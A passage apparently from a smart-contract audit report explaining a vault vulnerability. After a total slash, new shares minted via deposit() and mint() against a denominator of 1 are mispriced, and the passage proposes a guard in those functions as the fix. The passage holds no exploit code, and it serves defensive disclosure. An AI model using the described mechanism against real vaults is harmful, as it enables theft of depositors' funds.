* **It is not "the attacker would have been slashed anyway."** Control B slashes the vault just as completely, and the premium still distributes correctly: the underwriter's 1,000,000 FXRP keeps essentially the whole 50,000 FXRP premium while the opportunist's 1 FXRP takes 0.05. The vault handles a total wipe correctly for shares that already exist.

What is broken is narrower than "slashing" or "yield distribution": it is the issuance of **new** shares against a pool whose denominator has collapsed to `1`. That is why a guard in `deposit()` and `mint()` is a sufficient fix, and why the defect does not implicate the payout or reward paths themselves.
